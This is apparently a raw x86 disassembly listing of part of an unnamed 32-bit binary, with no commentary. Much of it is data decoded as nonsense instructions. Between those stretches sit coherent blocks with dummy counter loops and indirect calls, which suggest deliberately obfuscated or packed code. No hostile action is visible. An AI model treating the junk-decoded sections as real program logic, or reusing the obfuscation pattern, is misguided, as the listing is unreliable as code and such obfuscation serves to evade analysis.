  40a6d5:	out    0x2d,al
  40a6d7:	in     eax,dx
  40a6d8:	mov    dl,0xdb
  40a6da:	retf   
  40a6db:	or     DWORD PTR [eax+0x54],ebx
  40a6de:	not    DWORD PTR [ecx]
  40a6e0:	out    0x1a,eax
  40a6e2:	fnstcw WORD PTR [esi]
  40a6e4:	mov    ecx,0x4a27ff80
  40a6e9:	push   ds
  40a6ea:	ror    bh,cl
  40a6ec:	out    dx,eax
  40a6ed:	xor    ah,cl
  40a6ef:	pop    esp
  40a6f0:	add    al,0xf5
  40a6f2:	in     al,dx
  40a6f3:	jmpw   0x3443
  40a6f7:	xchg   edi,eax
  40a6f8:	adc    eax,0x6a931ae3
  40a6fd:	inc    esi
  40a6fe:	inc    esi
  40a6ff:	fst    st(5)
  40a701:	mov    cl,0xd7
  40a703:	pushf  
  40a704:	aas    
  40a705:	dec    esi
  40a706:	es stos BYTE PTR es:[edi],al
  40a708:	inc    ebp
  40a709:	ret    0xd9a7
  40a70c:	pop    edx
  40a70d:	sar    BYTE PTR [edi-0x7a],0x82
  40a711:	jbe    0x40a774
  40a713:	mov    al,ds:0x240cd005
  40a718:	mov    esp,0x2b00ded5
  40a71d:	fbstp  TBYTE PTR [eax+0x31]
  40a720:	sub    al,0xe3
  40a722:	inc    edi
  40a723:	jnp    0x40a73f
  40a725:	lahf   
  40a726:	mov    ebp,0x29819eef
  40a72b:	jno    0x40a6ed
  40a72d:	add    eax,0x640d5278
  40a732:	push   ebp
  40a733:	stos   DWORD PTR es:[edi],eax
  40a734:	xor    eax,DWORD PTR [esi-0x50]
  40a737:	ret    0x951f
  40a73a:	cmc    
  40a73b:	arpl   WORD PTR [ecx],ax
  40a73d:	push   ecx
  40a73e:	fbld   TBYTE PTR [esp+edi*4+0x4598c15e]
  40a745:	mov    ebx,0x173f3b32
  40a74a:	add    BYTE PTR [eax+ebp*2-0x18e0779f],ah
  40a751:	mov    ebx,0x59cf8df9
  40a756:	or     ax,0x5e3f
  40a75a:	pushf  
  40a75b:	mov    edi,0x95c140e6
  40a760:	mov    esp,0x2c7012af
  40a765:	xchg   edi,eax
  40a766:	retf   0xf238
  40a769:	xchg   ecx,eax
  40a76a:	push   ebp
  40a76b:	sbb    edi,ebx
  40a76d:	and    DWORD PTR [edi+eax*1+0x4e],ebx
  40a771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a772:	cmp    eax,esi
  40a774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a775:	or     ecx,DWORD PTR [ebp+0x5e]
  40a778:	arpl   WORD PTR [edi+0x1b],si
  40a77b:	sub    eax,0xb2dbd16c
  40a780:	push   0x68f35d02
  40a785:	arpl   WORD PTR [edi],ax
  40a787:	mov    eax,0xed5c4617
  40a78c:	push   edi
  40a78d:	jmp    0x40a945
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2-0xc]
  40a79f:	push   0xffffffa6
  40a7a1:	xchg   ebx,eax
  40a7a2:	ja     0x40a793
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a7aa
  40a7ab:	pushf  
  40a7ac:	xor    DWORD PTR [eax+0xf],edi
  40a7af:	and    eax,0x674e2703
  40a7b4:	sub    esi,DWORD PTR [ecx-0x7e]
  40a7b7:	pop    esi
  40a7b8:	mov    cl,0x41
  40a7ba:	lds    eax,FWORD PTR [ebx]
  40a7bc:	sbb    BYTE PTR [ecx+0x5102a5dd],0xed
  40a7c3:	sbb    BYTE PTR [esi],0x94
  40a7c6:	push   es
  40a7c7:	mov    eax,ds:0x5c007f73
  40a7cc:	das    
  40a7cd:	mov    ds:0x245d61a5,al
  40a7d2:	mov    esi,0xe73f09ee
  40a7d7:	push   es
  40a7d8:	and    DWORD PTR [ebp+edi*2-0x75c80881],ecx
  40a7df:	cmp    BYTE PTR [ebx],0x2b
  40a7e2:	pop    edx
  40a7e3:	call   DWORD PTR [edx+0x10]
  40a7e6:	push   es
  40a7e7:	adc    DWORD PTR [ebx+eiz*4],esp
  40a7ea:	xchg   ebx,eax
  40a7eb:	add    ch,ch
  40a7ed:	inc    ebp
  40a7ee:	cli    
  40a7ef:	clc    
  40a7f0:	or     ecx,DWORD PTR [ebp-0x1f]
  40a7f3:	and    cl,BYTE PTR [edx+0x4da8f4bb]
  40a7f9:	sub    ebp,DWORD PTR [edi]
  40a7fb:	retf   0x1ac5
  40a7fe:	sub    BYTE PTR [ecx],al
  40a800:	jno    0x40a841
  40a802:	and    dl,BYTE PTR [eax-0x43]
  40a805:	xor    eax,0xd496eab5
  40a80a:	dec    eax
  40a80b:	fldenv [edi+0x32]
  40a80e:	and    edx,DWORD PTR [ebp-0x3d]
  40a811:	push   es
  40a812:	minps  xmm7,xmm6
  40a815:	xor    BYTE PTR [ebx+ebx*4+0x31],dh
  40a819:	lds    ecx,FWORD PTR [ecx]
  40a81b:	mov    esp,0xc33d44bb
  40a820:	loopne 0x40a844
  40a822:	outs   dx,DWORD PTR ds:[esi]
  40a823:	jmp    0x40a7ba
  40a825:	jb     0x40a822
  40a827:	xor    eax,0x393c893b
  40a82c:	inc    edx
  40a82d:	jbe    0x40a81f
  40a82f:	dec    esp
  40a830:	pop    esi
  40a831:	mov    ecx,0xd16f699
  40a836:	cdq    
  40a837:	mov    BYTE PTR [edi],0x84
  40a83a:	lahf   
  40a83b:	xor    esi,ebp
  40a83d:	pop    edi
  40a83e:	out    dx,eax
  40a83f:	nop
  40a840:	fisttp WORD PTR [esi+edi*2+0x50]
  40a844:	add    cl,ah
  40a846:	cld    
  40a847:	mov    DWORD PTR [esi],ebp
  40a849:	dec    edx
  40a84a:	aaa    
  40a84b:	add    dh,cl
  40a84d:	and    bh,ah
  40a84f:	sub    bh,BYTE PTR [eax]
  40a851:	ins    BYTE PTR es:[edi],dx
  40a852:	imul   edx,DWORD PTR [esi+0x7f],0x13e6ce2e
  40a859:	fcom   DWORD PTR [esi+ecx*4]
  40a85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85d:	jbe    0x40a86a
  40a85f:	dec    ecx
  40a860:	fsub   QWORD PTR [edi+0x42]
  40a863:	cmc    
  40a864:	jmp    0x40a82e
  40a866:	mov    eax,ds:0x4a05ddb8
  40a86b:	adc    BYTE PTR [esi+ebx*4],bl
  40a86e:	nop
  40a86f:	sub    al,0x98
  40a871:	mov    dh,0x71
  40a873:	mov    BYTE PTR [ecx+0x3f0a57c2],cl
  40a879:	es xchg esp,eax
  40a87b:	jmp    0x7ca7cf5
  40a880:	pop    esp
  40a881:	aam    0x4b
  40a883:	jo     0x40a850
  40a885:	mov    al,ds:0x2345a1f2
  40a88a:	mov    fs,WORD PTR [eax]
  40a88c:	fadd   st(3),st
  40a88e:	fimul  WORD PTR [edi-0x4fffc0aa]
  40a894:	cmp    eax,0x7f5ca6e2
  40a899:	call   0x3287:0xc9ee0960
  40a8a0:	and    BYTE PTR [ebp-0x17],0x1f
  40a8a4:	push   ecx
  40a8a5:	sub    al,0x94
  40a8a7:	fisub  WORD PTR [ebp-0x5a]
  40a8aa:	cs adc eax,0xe840e60
  40a8b0:	push   edx
  40a8b1:	(bad)  
  40a8b2:	ficom  WORD PTR [esi+0x3a]
  40a8b5:	cld    
  40a8b6:	and    eax,0xa964b943
  40a8bb:	adc    ch,ch
  40a8bd:	in     al,dx
  40a8be:	jbe    0x40a849
  40a8c0:	push   ebx
  40a8c1:	aad    0x35
  40a8c3:	jae    0x40a8d3
  40a8c5:	in     eax,dx
  40a8c6:	sub    BYTE PTR [esi+0x7a],ch
  40a8c9:	add    esp,eax
  40a8cb:	lock or edi,ecx
  40a8ce:	adc    DWORD PTR [edi],esi
  40a8d0:	mov    edi,ebp
  40a8d2:	adc    eax,0xa158b6aa
  40a8d7:	inc    esp
  40a8d8:	xchg   ebp,eax
  40a8d9:	pushf  
  40a8da:	test   BYTE PTR [ecx+0x7e30d54c],dl
  40a8e0:	mov    dl,0xa2
  40a8e2:	stc    
  40a8e3:	mov    dl,0x6
  40a8e5:	pop    ecx
  40a8e6:	mov    ds:0xf27009ad,al
  40a8eb:	xchg   edi,eax
  40a8ec:	push   esp
  40a8ed:	ret    
  40a8ee:	into   
  40a8ef:	push   esp
  40a8f0:	pop    esp
  40a8f1:	jbe    0x40a8c8
  40a8f3:	fidiv  DWORD PTR [eax-0x7646c7e1]
  40a8f9:	xor    eax,0xc7f3a205
  40a8fe:	add    DWORD PTR [esi+eiz*8],ecx
  40a901:	jl     0x40a8c7
  40a903:	int    0x17
  40a905:	xchg   esi,eax
  40a906:	mov    esi,0xb7008785
  40a90b:	arpl   WORD PTR [ebx+esi*4],ax
  40a90e:	or     DWORD PTR [edx],ebx
  40a910:	jno    0x40a8f6
  40a912:	mov    cl,0x6e
  40a914:	jmp    0x40a8b8
  40a916:	aas    
  40a917:	xchg   esi,eax
  40a918:	add    eax,0xfcd37e1c
  40a91d:	sbb    eax,0x98eeea05
  40a922:	nop
  40a923:	jmp    0x15a5:0x93e00ffa
  40a92a:	iret   
  40a92b:	daa    
  40a92c:	push   edi
  40a92d:	mov    ch,BYTE PTR [edx]
  40a92f:	and    BYTE PTR [esi+0x67],dh
  40a932:	jmp    0x40a932
  40a934:	imul   ebx,DWORD PTR [esi-0x2b3962bd],0xbe781b45
  40a93e:	enter  0x9450,0x20
  40a942:	aas    
  40a943:	test   dh,bh
  40a945:	mov    edi,0x32729c
  40a94a:	adc    ebx,DWORD PTR ds:0x432608
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432ce2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434321
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432ce2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432cca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4325fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4325fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4325fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4325fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4325fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432c12
  40a9bb:	cmp    DWORD PTR ds:0x4325fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4325fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4325fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4325f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4325f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4325f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4325f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4325f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432b62
  40aa39:	cmp    DWORD PTR ds:0x4325f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4325f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4325f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434276,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43427e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43427e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43427e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43427e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43427e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43265d
  40aaa8:	call   DWORD PTR ds:0x432c16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43426e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4342a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432cc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434292
  40aae3:	sbb    DWORD PTR ds:0x4325ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434319,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432ce2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434292,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x967cbad5
  40ab36:	pop    ebx
  40ab37:	fild   WORD PTR [ecx+0x7070ed8c]
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40ab70
  40ab42:	xor    BYTE PTR [edi],cl
  40ab44:	or     al,0xfb
  40ab46:	shl    esi,cl
  40ab48:	inc    esp
  40ab49:	sub    bl,BYTE PTR [eax]
  40ab4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab4c:	popf   
  40ab4d:	or     cl,al
  40ab4f:	sbb    edi,esi
  40ab51:	or     DWORD PTR [ebx+0x76],esp
  40ab54:	emms   
  40ab56:	stc    
  40ab57:	cmp    BYTE PTR [eax+0x51e3de4b],0x61
  40ab5e:	xchg   ecx,eax
  40ab5f:	add    al,0x2b
  40ab61:	jno    0x40ab57
  40ab63:	loopne 0x40ab80
  40ab65:	lahf   
  40ab66:	mov    al,ds:0xa9b00b95
  40ab6b:	mov    edx,0xfc44d044
  40ab70:	js     0x40abab
  40ab72:	dec    ecx
  40ab73:	daa    
  40ab74:	scas   eax,DWORD PTR es:[edi]
  40ab75:	ds or  ax,0x200b
  40ab7a:	(bad)  
  40ab7b:	sbb    eax,0x2c2ae8c2
  40ab80:	xor    eax,0xd95f1f14
  40ab85:	fcom   QWORD PTR [ecx+0x5ea48afd]
  40ab8b:	and    DWORD PTR [eax],eax
  40ab8d:	push   ebx
  40ab8e:	ins    BYTE PTR es:[edi],dx
  40ab8f:	push   esp
  40ab90:	ror    BYTE PTR [esi-0x3bde50a2],1
  40ab96:	add    DWORD PTR [ecx+esi*8],0xffffffbd
  40ab9a:	cld    
  40ab9b:	pop    ss
  40ab9c:	jo     0x40ab91
  40ab9e:	loop   0x40ab77
  40aba0:	pop    ebx
  40aba1:	pusha  
  40aba2:	mov    cl,0xac
  40aba4:	loopne 0x40ab6d
  40aba6:	into   
  40aba7:	leave  
  40aba8:	pop    esi
  40aba9:	into   
  40abaa:	add    esi,DWORD PTR gs:[edx+0x7a2a5433]
  40abb1:	gs mov cl,0xfc
  40abb4:	leave  
  40abb5:	imul   ecx,DWORD PTR [ebx],0xffffffab
  40abb8:	mov    dh,0x84
  40abba:	jmp    0x89cd:0xe945130
  40abc1:	add    dl,BYTE PTR [eax]
  40abc3:	hlt    
  40abc4:	out    0x57,eax
  40abc6:	rep lods eax,DWORD PTR ds:[esi]
  40abc8:	imul   esi,edx,0xffffffa2
  40abcb:	push   0x61
  40abcd:	push   ss
  40abce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcf:	add    eax,0xb855404b
  40abd4:	sub    ah,bh
  40abd6:	pop    ss
  40abd7:	cs sbb eax,0x3e6955d0
  40abdd:	(bad)  
  40abde:	xchg   ebx,eax
  40abdf:	sub    eax,0xc261f359
  40abe4:	mov    ebp,0xd6733276
  40abe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abea:	(bad)  
  40abeb:	ins    DWORD PTR es:[edi],dx
  40abec:	or     ch,BYTE PTR [ebx+0x15]
  40abef:	les    eax,FWORD PTR [ecx+eax*4]
  40abf2:	in     eax,0xff
  40abf4:	xchg   esi,eax
  40abf5:	out    0x57,al
  40abf7:	aas    
  40abf8:	push   cs
  40abf9:	push   edx
  40abfa:	pop    esp
  40abfb:	dec    eax
  40abfc:	in     al,0xf4
  40abfe:	mov    ebx,edi
  40ac00:	enter  0x3345,0x6d
  40ac04:	jno    0x40ab8a
  40ac06:	xchg   esp,eax
  40ac07:	mov    dl,0x4e
  40ac09:	sub    eax,0x77c9f2ee
  40ac0e:	in     al,0x54
  40ac10:	jg     0x40ac7b
  40ac12:	(bad)  
  40ac13:	in     al,dx
  40ac14:	mov    bl,bl
  40ac16:	push   ecx
  40ac17:	js     0x40abd8
  40ac19:	popa   
  40ac1a:	dec    eax
  40ac1b:	add    BYTE PTR [ebx],ch
  40ac1d:	popa   
  40ac1e:	call   0x6fc76121
  40ac23:	mov    ebx,0xb1ec30f7
  40ac28:	dec    edx
  40ac29:	mov    al,ds:0xd0110e3b
  40ac2e:	pop    edi
  40ac2f:	test   al,0xbe
  40ac31:	ficom  DWORD PTR [esp+eax*2-0xf]
  40ac35:	dec    ecx
  40ac36:	ins    DWORD PTR es:[edi],dx
  40ac37:	nop
  40ac38:	mov    ebp,0x1db60779
  40ac3d:	(bad)  
  40ac3e:	push   0x65
  40ac40:	int3   
  40ac41:	xor    BYTE PTR [eax],ch
  40ac43:	shr    BYTE PTR [esi-0x634555a5],cl
  40ac49:	ins    BYTE PTR es:[edi],dx
  40ac4a:	mov    al,0x83
  40ac4c:	in     eax,0x8a
  40ac4e:	inc    esi
  40ac4f:	dec    DWORD PTR [ebx]
  40ac51:	daa    
  40ac52:	and    ebx,ecx
  40ac54:	add    cl,ch
  40ac56:	adc    DWORD PTR [edx],ebx
  40ac58:	adc    BYTE PTR [esi],bl
  40ac5a:	cli    
  40ac5b:	xor    eax,0x20d55036
  40ac60:	inc    ecx
  40ac61:	push   0x75f8a5ba
  40ac66:	(bad)  
  40ac67:	retf   
  40ac68:	dec    edx
  40ac69:	outs   dx,BYTE PTR ds:[esi]
  40ac6a:	mov    ch,0x66
  40ac6c:	add    BYTE PTR ds:0x288b17cc,0x4f
  40ac73:	repnz and al,BYTE PTR [edi]
  40ac76:	push   ebp
  40ac77:	aaa    
  40ac78:	adc    eax,0x1d08775c
  40ac7d:	adc    eax,0xd5c9f1ef
  40ac82:	add    ch,dl
  40ac84:	out    0xb6,al
  40ac86:	mov    edx,0x13ccba72
  40ac8b:	and    DWORD PTR [esi-0x29],ebx
  40ac8e:	jmp    0x79592487
  40ac93:	sbb    edi,DWORD PTR [edx]
  40ac95:	mov    ebx,0x45ba4de
  40ac9a:	add    ch,dh
  40ac9c:	mov    ecx,0x9f7c064f
  40aca1:	mov    cl,0xf5
  40aca3:	inc    ecx
  40aca4:	push   ecx
  40aca5:	mov    ah,0x29
  40aca7:	inc    edi
  40aca8:	aam    0xcc
  40acaa:	inc    ebx
  40acab:	repnz mov ebx,0xdc49caa0
  40acb1:	jo     0x40ac86
  40acb3:	adc    bl,BYTE PTR [ecx]
  40acb5:	pop    eax
  40acb6:	iret   
  40acb7:	sub    DWORD PTR [ebx],ecx
  40acb9:	stos   BYTE PTR es:[edi],al
  40acba:	and    edx,ebx
  40acbc:	daa    
  40acbd:	rcr    BYTE PTR [eax-0x7a048bd6],cl
  40acc3:	inc    ebx
  40acc4:	push   cs
  40acc5:	das    
  40acc6:	popa   
  40acc7:	outs   dx,BYTE PTR ds:[esi]
  40acc8:	dec    esi
  40acc9:	push   ebx
  40acca:	jl     0x40ad1a
  40accc:	and    eax,0x1b276238
  40acd1:	sub    bl,ch
  40acd3:	push   ds
  40acd4:	adc    eax,edi
  40acd6:	pop    edx
  40acd7:	std    
  40acd8:	fcomp  DWORD PTR [edi]
  40acda:	xlat   BYTE PTR ds:[ebx]
  40acdb:	fmul   QWORD PTR [ebx+0x4d8b0845]
  40ace1:	clc    
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	bound  ebx,QWORD PTR [ecx]
  40ad46:	adc    BYTE PTR [edi],ch
  40ad48:	and    ebx,ebp
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ad89
  40ad51:	jmp    0x40ad2a
  40ad53:	adc    eax,0x8c816f3a
  40ad58:	cs dec ebx
  40ad5a:	or     ebp,DWORD PTR [eax+0x26]
  40ad5d:	data16 loope 0x40ad13
  40ad60:	push   cs
  40ad61:	xchg   ebp,eax
  40ad62:	inc    ebp
  40ad63:	sub    ch,BYTE PTR [edi+0x55aa017c]
  40ad69:	ins    BYTE PTR es:[edi],dx
  40ad6a:	adc    bl,BYTE PTR [ebx+ecx*2]
  40ad6d:	aad    0xce
  40ad6f:	or     eax,0x92ab86fa
  40ad74:	fsub   QWORD PTR [ecx]
  40ad76:	mov    eax,0x3dd28e49
  40ad7b:	pop    ebx
  40ad7c:	aas    
  40ad7d:	mov    dl,0x7e
  40ad7f:	pop    edi
  40ad80:	sub    al,0x75
  40ad82:	in     eax,0x36
  40ad84:	push   ss
  40ad85:	sub    BYTE PTR [bx-0x3de9],bl
  40ad8a:	(bad)  
  40ad8b:	ins    DWORD PTR es:[edi],dx
  40ad8c:	add    DWORD PTR [ecx-0xa],ebp
  40ad8f:	xor    al,0x25
  40ad91:	mov    esp,0xa1bb1fe8
  40ad96:	test   DWORD PTR [ebx],0xc492cc3c
  40ad9c:	ja     0x40ad33
  40ad9e:	ins    BYTE PTR es:[edi],dx
  40ad9f:	lahf   
  40ada0:	loope  0x40ad8a
  40ada2:	jns    0x40add5
  40ada4:	inc    ebx
  40ada5:	hlt    
  40ada6:	test   DWORD PTR [edi+0x19],0x17bd93ca
  40adad:	in     eax,0xb9
  40adaf:	imul   ebp,ecx,0xc00a2d10
  40adb5:	popf   
  40adb6:	int    0x5d
  40adb8:	test   eax,0x235d766f
  40adbd:	test   ch,ch
  40adbf:	shr    BYTE PTR [esp+ebp*8+0x31c1155c],cl
  40adc6:	push   ss
  40adc7:	fldcw  WORD PTR [edi]
  40adc9:	jle    0x40ad86
  40adcb:	xor    DWORD PTR [esi+0x12b2866e],0xcf0659d7
  40add5:	jne    0x40ae17
  40add7:	addr16 push cs
  40add9:	mov    bh,0x81
  40addb:	test   eax,0xd9576086
  40ade0:	xchg   esi,eax
  40ade1:	in     al,0x0
  40ade3:	shl    BYTE PTR [edi+0x67e1c6b9],1
  40ade9:	cwde   
  40adea:	pop    edi
  40adeb:	mov    BYTE PTR [edi-0x634ede57],dl
  40adf1:	xchg   BYTE PTR [edx],dh
  40adf3:	and    dh,BYTE PTR [esi]
  40adf5:	push   ecx
  40adf6:	out    0x54,al
  40adf8:	icebp  
  40adf9:	fcomp  QWORD PTR [edx+0x4af6b281]
  40adff:	sbb    eax,0x1538b9f
  40ae04:	repz cmp al,0x3f
  40ae07:	xchg   ebp,eax
  40ae08:	jg     0x40adf0
  40ae0a:	loopne 0x40ae2d
  40ae0c:	pop    es
  40ae0d:	dec    eax
  40ae0e:	pop    edi
  40ae0f:	hlt    
  40ae10:	mov    esi,0x7dacce1e
  40ae15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae16:	mov    ah,0xbe
  40ae18:	fbld   TBYTE PTR [edi]
  40ae1a:	mov    ebp,0x419c5803
  40ae1f:	inc    eax
  40ae20:	(bad)  
  40ae22:	adc    ch,dh
  40ae24:	jnp    0x40ae29
  40ae26:	xor    al,0xfd
  40ae28:	push   0xffffff81
  40ae2a:	push   0xffffffb7
  40ae2c:	mov    ah,0x7a
  40ae2e:	pop    eax
  40ae2f:	xchg   BYTE PTR [edi-0x2e],al
  40ae32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae33:	fwait
  40ae34:	cmp    al,0xd
  40ae36:	(bad)  
  40ae37:	mov    ebp,edx
  40ae39:	or     eax,0x1953c2aa
  40ae3e:	fmulp  st(7),st
  40ae40:	mov    edx,0x431ef496
  40ae45:	mov    al,0xe5
  40ae47:	pop    ecx
  40ae48:	xchg   DWORD PTR [edx+0x488e6d3d],edi
  40ae4e:	inc    edi
  40ae4f:	fimul  WORD PTR [ebx-0x41d0bfbb]
  40ae55:	std    
  40ae56:	mov    dl,0x67
  40ae58:	cld    
  40ae59:	dec    esi
  40ae5a:	inc    edx
  40ae5b:	in     al,dx
  40ae5c:	clc    
  40ae5d:	shl    eax,0x71
  40ae60:	mov    al,ds:0x3311d0d5
  40ae65:	loopne 0x40ae80
  40ae67:	into   
  40ae68:	jnp    0x40ae4e
  40ae6a:	and    edx,DWORD PTR [ebp-0x5fdb33c9]
  40ae70:	push   0x735ca8ea
  40ae75:	out    0xb7,al
  40ae77:	imul   esp,DWORD PTR ds:0x623c83e8,0xf8d8ac2d
  40ae81:	mov    ebx,DWORD PTR [ebp+ebx*2+0x455a018f]
  40ae88:	mov    ecx,0x69e2d595
  40ae8d:	push   esi
  40ae8e:	mov    eax,ds:0x75d73bc9
  40ae93:	sbb    edi,edi
  40ae95:	cld    
  40ae96:	jmp    0x444f7070
  40ae9b:	or     dl,ah
  40ae9d:	fs dec esi
  40ae9f:	ret    0xeb5e
  40aea2:	loopne 0x40af06
  40aea4:	lods   al,BYTE PTR ds:[esi]
  40aea5:	push   0xffffffc3
  40aea7:	call   FWORD PTR [esi]
  40aea9:	fmul   st,st(3)
  40aeab:	shr    ah,cl
  40aead:	jmp    0x42d5:0x859b510b
  40aeb4:	xchg   edi,eax
  40aeb5:	sbb    esp,DWORD PTR [ebp+0x95ab4aa]
  40aebb:	xor    al,al
  40aebd:	call   0x57823991
  40aec2:	mov    al,0x29
  40aec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec5:	cmp    DWORD PTR [esi],edx
  40aec7:	xchg   ebx,eax
  40aec8:	dec    ebx
  40aec9:	fsubp  st(6),st
  40aecb:	outs   dx,BYTE PTR ds:[esi]
  40aecc:	sub    al,0xff
  40aece:	mov    eax,0xb5ae6e7d
  40aed3:	adc    eax,DWORD PTR ds:0x6db5ca70
  40aed9:	popf   
  40aeda:	stos   DWORD PTR es:[edi],eax
  40aedb:	je     0x40aed5
  40aedd:	call   0x8852:0x963814c
  40aee4:	mov    ds:0x5f074675,al
  40aee9:	sub    esp,esi
  40aeeb:	mov    ecx,DWORD PTR [ebp+0xc]
  40aeee:	xor    eax,esi
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
